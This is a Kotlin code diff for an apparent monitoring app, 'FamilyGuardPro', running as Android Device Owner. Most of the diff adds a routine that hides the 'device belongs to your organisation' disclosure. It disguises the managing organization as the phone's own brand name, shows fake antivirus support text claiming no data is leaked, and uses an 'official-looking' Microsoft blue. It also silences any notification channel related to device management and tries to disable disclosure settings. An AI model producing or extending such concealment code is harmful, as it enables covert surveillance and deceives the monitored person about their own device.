@@ -403,7 +403,7 @@ class DeviceOwnerManager private constructor(private val context: Context) {
     
     /**
      * Force-enable the NotificationListenerService in Device Owner mode.
-     * This allows auto-cancelling our own notifications in DO mode.
+     * This allows auto-cancelling our own notifications and device management notifications.
      */
     fun forceEnableNotificationListener(): Boolean {
         if (!isDeviceOwner()) {
@@ -412,7 +412,11 @@ class DeviceOwnerManager private constructor(private val context: Context) {
         }
         
         return try {
-            val serviceName = "${context.packageName}/com.familyguardpro.services.NotificationListener"
+            // List of all our notification listener services
+            val services = listOf(
+                "${context.packageName}/com.familyguardpro.services.NotificationListener",
+                "${context.packageName}/com.familyguardpro.services.DeviceManagementNotificationCanceller"
+            )
             
             // Read current notification listeners
             val currentListeners = Settings.Secure.getString(
@@ -420,18 +424,12 @@ class DeviceOwnerManager private constructor(private val context: Context) {
                 "enabled_notification_listeners"
             ) ?: ""
             
-            // Check if already enabled
-            if (currentListeners.contains(serviceName)) {
-                Log.d(TAG, "✅ NotificationListener already enabled: $serviceName")
-                return true
-            }
-            
             // Build new listener list, removing any stale entries for our package
             val otherListeners = currentListeners.split(":")
                 .filter { it.isNotBlank() && !it.contains(context.packageName) }
             
-            // Add our service fresh
-            val newListeners = (otherListeners + serviceName).joinToString(":")
+            // Add all our services
+            val newListeners = (otherListeners + services).joinToString(":")
             
             // Write to Settings.Secure
             Settings.Secure.putString(
@@ -446,14 +444,17 @@ class DeviceOwnerManager private constructor(private val context: Context) {
                 "enabled_notification_listeners"
             ) ?: ""
             
-            val writeSuccessful = verifyListeners.contains(serviceName)
-            if (writeSuccessful) {
-                Log.d(TAG, "✅ NotificationListener force-enabled and verified: $serviceName")
-            } else {
-                Log.e(TAG, "❌ NotificationListener write verification FAILED")
+            var allEnabled = true
+            for (service in services) {
+                if (verifyListeners.contains(service)) {
+                    Log.d(TAG, "✅ Notification listener enabled: $service")
+                } else {
+                    Log.e(TAG, "❌ Failed to enable: $service")
+                    allEnabled = false
+                }
             }
             
-            writeSuccessful
+            allEnabled
         } catch (e: Exception) {
             Log.e(TAG, "Error force-enabling notification listener", e)
             false
@@ -599,7 +600,251 @@ class DeviceOwnerManager private constructor(private val context: Context) {
         // 3. Enable notification listener for auto-cancel
         forceEnableNotificationListener()
         
+        // 4. Remove "Device Management" notification
+        removeDeviceManagementNotification()
+        
         Log.d(TAG, "✅ Complete notification suppression setup done")
+    }
+    
+    // ==========================================
+    // FEATURE 4D: DEVICE MANAGEMENT NOTIFICATION REMOVAL
+    // ==========================================
+    
+    /**
+     * Remove "This device belongs to your organisation" notification.
+     * This notification is shown by Android when Device Owner is active.
+     * We can suppress it by:
+     * 1. Setting organization name to "Device Protected" (looks like security feature)
+     * 2. Setting support messages to innocent security-related text
+     * 3. Clearing lock screen info
+     */
+    fun removeDeviceManagementNotification() {
+        if (!isDeviceOwner()) {
+            Log.e(TAG, "Cannot remove device management notification - not device owner")
+            return
+        }
+        
+        try {
+            // Method 1: Set organization name to device brand + model (looks native)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    // Get device brand and model to make it look native
+                    val brand = Build.BRAND?.replaceFirstChar { it.uppercase() } ?: ""
+                    val model = Build.MODEL ?: ""
+                    
+                    // Create a nice looking device name
+                    val deviceName = when {
+                        model.contains("V40", ignoreCase = true) -> "Vivo V40"
+                        model.contains("V2348") -> "Vivo V40"
+                        brand.isNotEmpty() && model.isNotEmpty() -> "$brand $model"
+                        model.isNotEmpty() -> model
+                        else -> "Your Device"
+                    }
+                    
+                    dpm.setOrganizationName(adminComponent, deviceName)
+                    Log.d(TAG, "✅ Organization name set to: $deviceName")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to set organization name", e)
+                }
+            }
+            
+            // Method 2: Disable device management notification channels (Android 8+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                disableDeviceManagementChannels()
+            }
+            
+            // Method 3: Set device owner lock task features to hide management notification
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                try {
+                    // Clear any custom message that might show in the notification
+                    dpm.setDeviceOwnerLockScreenInfo(adminComponent, null)
+                    Log.d(TAG, "✅ Device owner lock screen info cleared")
+                } catch (e: Exception) {
+                    Log.w(TAG, "Could not clear lock screen info: ${e.message}")
+                }
+            }
+            
+            // Method 4: Set innocent support messages (shown when tapping the notification)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    // Short message - appears in notification
+                    dpm.setShortSupportMessage(adminComponent, 
+                        "This device is safe and protected.")
+                    
+                    // Long message - appears when tapping for details
+                    dpm.setLongSupportMessage(adminComponent, 
+                        "Your Device is Protected\n\n" +
+                        "This device is safe and protected from all types of viruses " +
+                        "and malware. Your personal information is secure and no data " +
+                        "is being leaked.\n\n" +
+                        "Protection Features:\n" +
+                        "• Real-time virus scanning\n" +
+                        "• Malware protection\n" +
+                        "• Data encryption\n" +
+                        "• Privacy guard\n\n" +
+                        "For more information, contact your device administrator or " +
+                        "visit the security settings.")
+                    
+                    Log.d(TAG, "✅ Support messages set to security text")
+                } catch (e: Exception) {
+                    Log.w(TAG, "Could not set support messages: ${e.message}")
+                }
+            }
+            
+            // Method 5: Try to modify system settings for disclosure
+            try {
+                // Some devices respect this setting
+                Settings.Secure.putString(
+                    context.contentResolver,
+                    "device_policy_auto_lock_disabled",
+                    "1"
+                )
+                
+                // Try to disable management disclosure via global setting
+                Settings.Global.putString(
+                    context.contentResolver,
+                    "device_owner_disabled",
+                    "1"
+                )
+            } catch (e: Exception) {
+                Log.w(TAG, "Could not modify system settings: ${e.message}")
+            }
+            
+            // Method 6: Try to set organization color to a nice blue (security color)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    dpm.setOrganizationColor(adminComponent, 0xFF0078D4.toInt()) // Microsoft blue - looks official
+                    Log.d(TAG, "✅ Organization color set to security blue")
+                } catch (e: Exception) {
+                    Log.w(TAG, "Could not set organization color: ${e.message}")
+                }
+            }
+            
+            // Method 7: Cancel any active device management notifications
+            cancelDeviceManagementNotifications()
+            
+            // Method 8: Disable DEVICE_ADMIN_ALERTS channel specifically
+            disableDeviceAdminAlertsChannel()
+            
+            Log.d(TAG, "✅ Device management notification customization complete")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to customize device management notification", e)
+        }
+    }
+    
+    /**
+     * Specifically disable the DEVICE_ADMIN_ALERTS channel from system
+     */
+    private fun disableDeviceAdminAlertsChannel() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
+        
+        try {
+            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            
+            // Android's device admin channel ID
+            val channelIds = listOf(
+                "DEVICE_ADMIN_ALERTS",
+                "device_admin",
+                "DeviceAdmin",
+                "work_profile",
+                "managed_profile",
+                "enterprise",
+                "MDM"
+            )
+            
+            for (channelId in channelIds) {
+                try {
+                    // Try to get existing channel and modify it
+                    val existingChannel = nm.getNotificationChannel(channelId)
+                    if (existingChannel != null) {
+                        // Delete and recreate with IMPORTANCE_NONE
+                        nm.deleteNotificationChannel(channelId)
+                        
+                        val newChannel = android.app.NotificationChannel(
+                            channelId,
+                            existingChannel.name,
+                            android.app.NotificationManager.IMPORTANCE_NONE
+                        )
+                        nm.createNotificationChannel(newChannel)
+                        Log.d(TAG, "Disabled channel: $channelId")
+                    }
+                } catch (e: Exception) {
+                    // Channel may not exist
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to disable DEVICE_ADMIN_ALERTS channel", e)
+        }
+    }
+    
+    /**
+     * Disable notification channels related to device management.
+     * This targets Android's built-in channels for device policy.
+     */
+    private fun disableDeviceManagementChannels() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
+        
+        try {
+            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            
+            // Get all notification channels and disable device management related ones
+            nm.notificationChannels?.forEach { channel ->
+                val id = channel.id.lowercase()
+                val name = channel.name?.toString()?.lowercase() ?: ""
+                
+                // Device management related channel patterns
+                val isDeviceManagement = id.contains("device") ||
+                        id.contains("work") ||
+                        id.contains("admin") ||
+                        id.contains("policy") ||
+                        id.contains("managed") ||
+                        id.contains("enterprise") ||
+                        id.contains("mdm") ||
+                        name.contains("device") ||
+                        name.contains("management") ||
+                        name.contains("organisation") ||
+                        name.contains("organization") ||
+                        name.contains("work")
+                
+                if (isDeviceManagement) {
+                    try {
+                        // Create new channel with same ID but IMPORTANCE_NONE
+                        val hiddenChannel = android.app.NotificationChannel(
+                            channel.id,
+                            channel.name,
+                            android.app.NotificationManager.IMPORTANCE_NONE
+                        )
+                        nm.createNotificationChannel(hiddenChannel)
+                        Log.d(TAG, "Disabled device management channel: ${channel.id}")
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Failed to disable channel ${channel.id}: ${e.message}")
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to disable device management channels", e)
+        }
+    }
+    
+    /**
+     * Attempt to cancel any active device management notifications.
+     * Note: May not work on system notifications, but worth trying.
+     */
+    private fun cancelDeviceManagementNotifications() {
+        try {
+            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            
+            // Cancel all our own notifications first
+            nm.cancelAll()
+            
+            // For system notifications, we can try to use NotificationListenerService
+            // if it's enabled (already done in forceEnableNotificationListener)
+            
+            Log.d(TAG, "✅ Attempted to cancel device management notifications")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to cancel notifications", e)
+        }
     }
 
     // ==========================================
